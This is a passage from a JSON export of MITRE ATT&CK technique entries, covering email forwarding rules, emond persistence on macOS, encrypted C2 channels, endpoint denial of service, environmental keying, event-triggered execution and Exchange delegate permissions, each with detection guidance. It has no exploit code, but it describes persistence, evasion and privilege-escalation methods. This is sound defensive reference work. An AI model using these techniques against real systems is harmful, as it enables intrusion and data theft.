The <code>forwardingSMTPAddress</code> parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) High volumes of emails that bear the <code>X-MS-Exchange-Organization-AutoForwarded</code> header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\",\"Office 365\"],\"x_mitre_version\":\"2.1\"}",
    "{\"created\":\"2020-02-19T18:54:47.103Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.(Citation: US-CERT TA18-068A 2018) Outlook and Outlook Web App (OWA) allow users to create inbox rules for various email functions, including forwarding to a different recipient. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) \\n\\nAny user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more.\",\"external_references\":[{\"external_id\":\"T1114.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1114/003\"},{\"description\":\"US-CERT. (2018, March 27). TA18-068A Brute Force Attacks Conducted by Cyber Actors. Retrieved October 2, 2019.\",\"source_name\":\"US-CERT TA18-068A 2018\",\"url\":\"https://www.us-cert.gov/ncas/alerts/TA18-086A\"},{\"description\":\"McMichael, T.. (2015, June 8). Exchange and Office 365 Mail Forwarding. Retrieved October 8, 2019.\",\"source_name\":\"Microsoft Tim McMichael Exchange Mail Forwarding 2\",\"url\":\"https://blogs.technet.microsoft.com/timmcmic/2015/06/08/exchange-and-office-365-mail-forwarding-2/\"}],\"id\":\"attack-pattern--7d77a07d-02fe-4e88-8bd9-e9c008c01bf0\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-03-24T18:29:48.994Z\",\"name\":\"Email Forwarding Rule\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Swetha Prabakaran, Microsoft Threat Intelligence Center (MSTIC)\"],\"x_mitre_data_sources\":[\"Process use of network\",\"Process monitoring\",\"Email gateway\",\"Mail server\",\"Office 365 trace logs\"],\"x_mitre_detection\":\"Detection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account.\\n\\nAuto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include `X-MS-Exchange-Organization-AutoForwarded` set to true, `X-MailFwdBy` and `X-Forwarded-To`. The `forwardingSMTPAddress` parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.(Citation: Microsoft Tim McMichael Exchange Mail Forwarding 2) High volumes of emails that bear the `X-MS-Exchange-Organization-AutoForwarded` header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Office 365\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-09-19T14:07:11.734Z\",\"external_references\":[{\"external_id\":\"T1519\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1519\"},{\"description\":\"Ross, Chris. (2018, January 17). Leveraging Emond on macOS For Persistence. Retrieved September 10, 2019.\",\"source_name\":\"xorrior emond Jan 2018\",\"url\":\"https://www.xorrior.com/emond-persistence/\"},{\"description\":\"Reynolds, James. (2016, April 7). What is emond?. Retrieved September 10, 2019.\",\"source_name\":\"magnusviri emond Apr 2016\",\"url\":\"http://www.magnusviri.com/Mac/what-is-emond.html\"},{\"description\":\"Stokes, Phil. (2019, June 17). HOW MALWARE PERSISTS ON MACOS. Retrieved September 10, 2019.\",\"source_name\":\"sentinelone macos persist Jun 2019\",\"url\":\"https://www.sentinelone.com/blog/how-malware-persists-on-macos/\"}],\"id\":\"attack-pattern--d376668f-b208-42de-b1f5-fdfe0ad4b753\",\"modified\":\"2020-01-24T15:15:44.006Z\",\"name\":\"Emond\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T15:15:13.426Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.\\n\\nThe rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)\\n\\nAdversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.\",\"external_references\":[{\"external_id\":\"T1546.014\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1546/014\"},{\"description\":\"Ross, Chris. (2018, January 17). Leveraging Emond on macOS For Persistence. Retrieved September 10, 2019.\",\"source_name\":\"xorrior emond Jan 2018\",\"url\":\"https://www.xorrior.com/emond-persistence/\"},{\"description\":\"Reynolds, James. (2016, April 7). What is emond?. Retrieved September 10, 2019.\",\"source_name\":\"magnusviri emond Apr 2016\",\"url\":\"http://www.magnusviri.com/Mac/what-is-emond.html\"},{\"description\":\"Stokes, Phil. (2019, June 17). HOW MALWARE PERSISTS ON MACOS. Retrieved September 10, 2019.\",\"source_name\":\"sentinelone macos persist Jun 2019\",\"url\":\"https://www.sentinelone.com/blog/how-malware-persists-on-macos/\"}],\"id\":\"attack-pattern--9c45eaa3-8604-4780-8988-b5074dbb9ecd\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-24T21:37:25.307Z\",\"name\":\"Emond\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Ivan Sinyakov\"],\"x_mitre_data_sources\":[\"File monitoring\"],\"x_mitre_detection\":\"Monitor emond rules creation by checking for files created or modified in <code>/etc/emond.d/rules/</code> and <code>/private/var/db/emondClients</code>.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-16T15:33:01.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.\",\"external_references\":[{\"external_id\":\"T1573\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1573\"},{\"description\":\"Butler, M. (2013, November). Finding Hidden Threats by Decrypting SSL. Retrieved April 5, 2016.\",\"source_name\":\"SANS Decrypting SSL\",\"url\":\"http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840\"},{\"description\":\"Dormann, W. (2015, March 13). The Risks of SSL Inspection. Retrieved April 5, 2016.\",\"source_name\":\"SEI SSL Inspection Risks\",\"url\":\"https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-30T00:37:16.809Z\",\"name\":\"Encrypted Channel\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"SSL/TLS inspection\",\"Process monitoring\",\"Process use of network\",\"Malware reverse engineering\",\"Netflow/Enclave netflow\",\"Packet capture\"],\"x_mitre_detection\":\"SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.(Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.(Citation: SEI SSL Inspection Risks)\\n\\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-04-18T11:00:55.862Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\\n\\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\\n\\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\\n\\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\\n\\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target\'s resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\\n\\nIn cases where traffic manipulation is used, there may be points in the the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)\\n\\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).\\n\",\"external_references\":[{\"external_id\":\"T1499\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1499\"},{\"external_id\":\"CAPEC-227\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/227.html\"},{\"external_id\":\"CAPEC-131\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/131.html\"},{\"external_id\":\"CAPEC-130\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/130.html\"},{\"external_id\":\"CAPEC-125\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/125.html\"},{\"description\":\"Ned Moran, Mike Scott, Mike Oppenheim of FireEye. (2014, November 3). Operation Poisoned Handover: Unveiling Ties Between APT Activity in Hong Kong’s Pro-Democracy Movement. Retrieved April 18, 2019.\",\"source_name\":\"FireEye OpPoisonedHandover February 2016\",\"url\":\"https://www.fireeye.com/blog/threat-research/2014/11/operation-poisoned-handover-unveiling-ties-between-apt-activity-in-hong-kongs-pro-democracy-movement.html\"},{\"description\":\"FS-ISAC. (2012, September 17). Fraud Alert – Cyber Criminals Targeting Financial Institution Employee Credentials to Conduct Wire Transfer Fraud. Retrieved April 18, 2019.\",\"source_name\":\"FSISAC FraudNetDoS September 2012\",\"url\":\"https://www.ic3.gov/media/2012/FraudAlertFinancialInstitutionEmployeeCredentialsTargeted.pdf\"},{\"description\":\"Wueest, C.. (2014, October 21). The continued rise of DDoS attacks. Retrieved April 24, 2019.\",\"source_name\":\"Symantec DDoS October 2014\",\"url\":\"https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-continued-rise-of-ddos-attacks.pdf\"},{\"description\":\"Preet Bharara, US Attorney. (2016, March 24). Retrieved April 23, 2019.\",\"source_name\":\"USNYAG IranianBotnet March 2016\",\"url\":\"https://www.justice.gov/opa/pr/seven-iranians-working-islamic-revolutionary-guard-corps-affiliated-entities-charged\"},{\"description\":\"Goodin, D.. (2015, March 31). Massive denial-of-service attack on GitHub tied to Chinese government. Retrieved April 19, 2019.\",\"source_name\":\"ArsTechnica Great Firewall of China\",\"url\":\"https://arstechnica.com/information-technology/2015/03/massive-denial-of-service-attack-on-github-tied-to-chinese-government/\"},{\"description\":\"Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow. Retrieved April 25, 2019.\",\"source_name\":\"Cisco DoSdetectNetflow\",\"url\":\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf\"}],\"id\":\"attack-pattern--c675646d-e204-4aa8-978d-e3d6d65885c4\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-03-29T02:07:27.676Z\",\"name\":\"Endpoint Denial of Service\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"SSL/TLS inspection\",\"Web logs\",\"Web application firewall logs\",\"Network intrusion detection system\",\"Network protocol analysis\",\"Network device logs\",\"Netflow/Enclave netflow\"],\"x_mitre_detection\":\"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.\\n\\nIn addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.\\n\\nExternally monitor the availability of services that may be targeted by an Endpoint DoS.\",\"x_mitre_impact_type\":[\"Availability\"],\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\",\"Office 365\",\"Azure AD\",\"SaaS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-06-23T22:28:28.041Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of [Execution Guardrails](https://attack.mitre.org/techniques/T1480) that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents)\\n\\nValues can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).\\n\\nSimilar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.\\n\\nLike other [Execution Guardrails](https://attack.mitre.org/techniques/T1480), environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.\",\"external_references\":[{\"external_id\":\"T1480.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1480/001\"},{\"description\":\"Riordan, J., Schneier, B. (1998, June 18). Environmental Key Generation towards Clueless Agents. Retrieved January 18, 2019.\",\"source_name\":\"EK Clueless Agents\",\"url\":\"https://www.schneier.com/academic/paperfiles/paper-clueless-agents.pdf\"},{\"description\":\"Kaspersky Lab. (2012, August). Gauss: Abnormal Distribution. Retrieved January 17, 2019.\",\"source_name\":\"Kaspersky Gauss Whitepaper\",\"url\":\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/20134940/kaspersky-lab-gauss.pdf\"},{\"description\":\"Kafeine. (2016, December 13). Home Routers Under Attack via Malvertising on Windows, Android Devices. Retrieved January 16, 2019.\",\"source_name\":\"Proofpoint Router Malvertising\",\"url\":\"https://www.proofpoint.com/us/threat-insight/post/home-routers-under-attack-malvertising-windows-android-devices\"},{\"description\":\"Song, C., et al. (2012, August 7). Impeding Automated Malware Analysis with Environment-sensitive Malware. Retrieved January 18, 2019.\",\"source_name\":\"EK Impeding Malware Analysis\",\"url\":\"https://pdfs.semanticscholar.org/2721/3d206bc3c1e8c229fb4820b6af09e7f975da.pdf\"},{\"description\":\"Warren, R. (2017, August 8). Smuggling HTA files in Internet Explorer/Edge. Retrieved January 16, 2019.\",\"source_name\":\"Environmental Keyed HTA\",\"url\":\"https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/smuggling-hta-files-in-internet-exploreredge/\"},{\"description\":\"Morrow, T., Pitts, J. (2016, October 28). Genetic Malware: Designing Payloads for Specific Targets. Retrieved January 18, 2019.\",\"source_name\":\"Ebowla: Genetic Malware\",\"url\":\"https://github.com/Genetic-Malware/Ebowla/blob/master/Eko_2016_Morrow_Pitts_Master.pdf\"},{\"description\":\"Warren, R. (2017, August 2). Demiguise: virginkey.js. Retrieved January 17, 2019.\",\"source_name\":\"Demiguise Guardrail Router Logo\",\"url\":\"https://github.com/nccgroup/demiguise/blob/master/examples/virginkey.js\"}],\"id\":\"attack-pattern--f244b8dd-af6c-4391-a497-fc03627ce995\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-24T18:52:12.719Z\",\"name\":\"Environmental Keying\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Nick Carr, FireEye\"],\"x_mitre_data_sources\":[\"Process monitoring\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Host forensic analysis\",\"Signature-based detection\",\"Static file analysis\"],\"x_mitre_detection\":\"Detecting the use of environmental keying may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of [Discovery](https://attack.mitre.org/tactics/TA0007), especially in a short period of time, may aid in detection.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-01-22T21:04:23.285Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. \\n\\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked. \\n\\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. \",\"external_references\":[{\"external_id\":\"T1546\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1546\"}],\"id\":\"attack-pattern--b6301b64-ef57-4cce-bb0b-77026f14a8db\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-05-05T12:02:46.188Z\",\"name\":\"Event Triggered Execution\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"API monitoring\",\"Windows event logs\",\"System calls\",\"Binary file metadata\",\"Process use of network\",\"WMI Objects\",\"File monitoring\",\"Process command-line parameters\",\"Process monitoring\",\"Loaded DLLs\",\"DLL monitoring\",\"Windows Registry\"],\"x_mitre_detection\":\"Monitoring for additions or modifications of mechanisms that could be used to trigger event-based execution, especially the addition of abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network. Also look for changes that do not line up with updates, patches, or other planned administrative activity. \\n\\nThese mechanisms may vary by OS, but are typically stored in central repositories that store configuration information such as the Windows Registry, Common Information Model (CIM), and/or specific named files, the last of which can be hashed and compared to known good values. \\n\\nMonitor for processes, API/System calls, and other common ways of manipulating these event repositories. \\n\\nTools such as Sysinternals Autoruns can be used to detect changes to execution triggers that could be attempts at persistence. Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.  \\n\\nMonitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement. \",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-01-19T16:54:28.516Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may grant additional permission levels, such as ReadPermission or FullAccess, to maintain persistent access to an adversary-controlled email account. The <code>Add-MailboxPermission</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission)(Citation: FireEye APT35 2018)(Citation: Crowdstrike Hiding in Plain Sight 2018)\\n\\nThis may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can assign more access rights to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex: [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)), so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)\",\"external_references\":[{\"external_id\":\"T1098.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1098/002\"},{\"description\":\"Microsoft. (n.d.). Add-Mailbox Permission. Retrieved September 13, 2019.\",\"source_name\":\"Microsoft - Add-MailboxPermission\",\"url\":\"https://docs.microsoft.com/en-us/powershell/module/exchange/mailboxes/add-mailboxpermission?view=exchange-ps\"},{\"description\":\"Mandiant. (2018). Mandiant M-Trends 2018. Retrieved July 9, 2018.\",\"source_name\":\"FireEye APT35 2018\",\"url\":\"https://www.fireeye.com/content/dam/collateral/en/mtrends-2018.pdf\"},{\"description\":\"Crowdstrike. (2018, July 18). Hiding in Plain Sight: Using the Office 365 Activities API to Investigate Business Email Compromises. Retrieved January 19, 2020.\",\"source_name\":\"Crowdstrike Hiding in Plain Sight 2018\",\"url\":\"https://www.crowdstrike.com/blog/hiding-in-plain-sight-using-the-office-365-activities-api-to-investigate-business-email-compromises/\"},{\"description\":\"Bienstock, D.. (2019). BECS and Beyond: Investigating and Defending O365. Retrieved September 13, 2019.\",\"source_name\":\"Bienstock, D. - Defending O365 - 2019\",\"url\":\"https://www.slideshare.net/DouglasBienstock/shmoocon-2019-becs-and-beyond-investigating-and-defending-office-365\"}],\"id\":\"attack-pattern--e74de37c-a829-446c-937d-56a44f0e9306\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-05-04T19:18:36.254Z\",\"name\":\"Exchange Email Delegate Permissions\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Jannie Li, Microsoft Threat Intelligence\u{202f}Center\u{202f}(MSTIC)\"],\"x_mitre_data_sources\":[\"Office 365 audit logs\"],\"x_mitre_detection\":\"Monitor for unusual Exchange and Office 365 email account permissions changes that may indicate excessively broad permissions being granted to compromised accounts.\\n\\nA larger than normal volume of emails sent from an account and similar phishing emails sent from \u{202f}real accounts within a network may be a sign that an account was compromised and attempts to leverage access with modified email permissions is occurring.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Windows\",\"Office 365\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-13T11:12:18.558Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\\n\\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).\\n\\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Access Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also 